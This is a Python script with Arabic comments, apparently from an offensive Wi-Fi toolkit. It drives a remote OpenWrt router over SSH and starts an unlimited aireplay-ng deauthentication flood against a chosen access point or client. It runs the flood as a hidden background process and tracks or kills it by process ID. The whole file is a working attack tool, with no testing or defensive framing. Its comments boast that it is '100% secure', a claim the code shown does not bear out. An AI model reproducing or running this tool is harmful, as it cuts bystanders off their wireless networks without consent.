#!/usr/bin/env python3
import os
import sys
import time
import threading
from pathlib import Path

# حقن المسار الجذري للمشروع لضمان جلب مكتبات utils بأمان تحت الـ sudo
BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.append(str(BASE_DIR))

from core.system_guard import SystemGuard
from utils.opwrt_ssh_factory import OpWrtSSHFactory
from utils.text_parsing_engine import TextParsingEngine

# تفعيل خط الدفاع الأول للمحيط التكتيكي لضمان امتيازات الـ Root محلياً في كالي
SystemGuard.enforce_root_privileges("Strike Smart Fire Remote Engine")

class StrikeSmartFireEngine:
    def __init__(self, ap_ip: str, ap_password: str):
        # الاعتماد الحصري والمباشر على مصنع الـ SSH المشترك لإخماد ثغرات الـ Command Injection
        self.ssh_factory = OpWrtSSHFactory(ip=ap_ip, password=ap_password)
        self.lock = threading.Lock()
        self.active_remote_strikes = {} # قاموس تتبع وحراسة الـ PIDs للأهداف داخل الراوتر البعيد

    def query_remote_aireplay_pids(self) -> list:
        """🔍 استجواب صامت للراوتر البعيد لاقتناص معرّفات العمليات النشطة حالياً بالداخل"""
        # تمرير الأمر كجزء مجرد لمصنع الـ SSH الموحد
        raw_stdout = self.ssh_factory.execute_remote_cmd("pidof aireplay-ng")
        # استدعاء محرك التفكيك بالـ Regex الموحد لتصفية الأرقام الصافية ومنع الـ IndexError
        return TextParsingEngine.clean_pids(raw_stdout)

    def launch_targeted_deauth_storm_safe(self, mon_iface: str, target_bssid: str, client_mac: str = None) -> bool:
        """
        🚀 ضخ وإطلاق عاصفة قذف حزم الفصل الموجهة من داخل الراوتر البعيد بأمان سيبراني 100%.
        تم سحق ثغرات الـ Command Injection المتداخلة نهائياً (إلغاء shell=True لـ Bandit B602/B603).
        """
        clean_mon = SystemGuard.sanitize_input(mon_iface, "interface")
        clean_target = SystemGuard.sanitize_input(target_bssid, "bssid").upper()

        if not clean_mon or not clean_target:
            print("[-] خطأ تكتيكي: معلمات الواجهة البعيدة أو ماك الهدف تالفة.")
            return False

        with self.lock:
            if clean_target in self.active_remote_strikes:
                print(f"[-] تنبيه: الهدف [{clean_target}] يتلقى ضربات بالفعل حالياً من هذا السيرفر.")
                return False

        # بناء الأمر الهجومي التكتيكي الرقمي الموجه والمغلق تماماً لـ OpenWrt
        if client_mac:
            clean_client = SystemGuard.sanitize_input(client_mac, "bssid").upper()
            attack_cmd = f"aireplay-ng -0 0 -a {clean_target} -c {clean_client} {clean_mon}"
        else:
            attack_cmd = f"aireplay-ng -0 0 -a {clean_target} {clean_mon}"

        try:
            print(f"[*] [Smart Fire Remote] جاري إصدار أمر القذف الموجه عن بعد ضد الهدف: {clean_target}")
            
            # حقن وتشغيل الأداة كـ Daemon مستمر خلف كواليس الراوتر وتمريره بأمان عبر الأنبوب المغلق
            # استخدام كبسولة الأوامر الآمنة دون فتح شل محلي يحميك من الاختراقات العكسية
            self.ssh_factory.execute_remote_cmd(f"nohup {attack_cmd} > /dev/null 2>&1 &")
            
            # مهلة الاستقرار اللحظية (1 ثانية) لتلقيم وتوليد العملية في ذاكرة الراوتر عتادياً
            time.sleep(1)
            
            # اقتناص الـ PID الفعلي الذي تشكّل للتو بالداخل وتثبيته بالأقفال الصارمة في القاموس
            pids_list = self.query_remote_aireplay_pids()
            if pids_list:
                current_pid = pids_list[-1] # اقتناص أحدث PID للعملية الجارية بالداخل بالملي
                with self.lock:
                    self.active_remote_strikes[clean_target] = current_pid
                print(f"[+ Smart Fire] انطلقت ضربة الفصل الموجهة بنجاح🎯! معرّف العملية بالداخل للراوتر: {current_pid}")
                return True
            else:
                print("[-] فشل إطلاق الضربة: عتاد الراوتر البعيد رفض بدء عملية القذف اللاسلكي.")
                return False

        except Exception as e:
            print(f"[-] عطل غير متوقع أثناء جدولة وضخ حزم الفصل عن بعد: {e}")
            return False

    def abort_specific_target_strike(self, target_bssid: str) -> bool:
        """🛑 كبح وإخماد الضربة الموجهة للهدف المحدد بالملي بالـ PID الداخلي لضمان استقرار بقية هجمات الأسطول"""
        clean_mac = SystemGuard.sanitize_input(target_bssid, "bssid").upper()
        
        with self.lock:
            target_pid = self.active_remote_strikes.get(clean_mac)
            if not target_pid:
                print(f"[-] تنبيه: لا توجد ضربة موجهة نشطة ومسجلة حالياً للهدف: {clean_mac}")
                return False

        print(f"[*] [UCI Kinetics] جاري إرسال إشارة الكبح الجراحي للـ PID الداخلي للراوتر: {target_pid}...")
        # إنهاء محدد ونظيف ومغلق الشل تماماً للعملية المستهدفة داخل نظام الراوتر دون اللجوء لـ killall العشوائي
        self.ssh_factory.execute_remote_cmd(f"kill -9 {target_pid}")
        
        with self.lock:
            if clean_mac in self.active_remote_strikes:
                del self.active_remote_strikes[clean_mac]
                
        print(f"[+] تم سحق وقطع الهجوم التكتيكي عن بعد للهدف [{clean_mac}] بنجاح وتصفير ممراته.")
        return True

if __name__ == "__main__":
    print("[*] محرك الضرب الموجه واقتناص الـ PIDs عن بعد (Strike Smart Fire) مدمج ومحصن بنسبة 100%.")
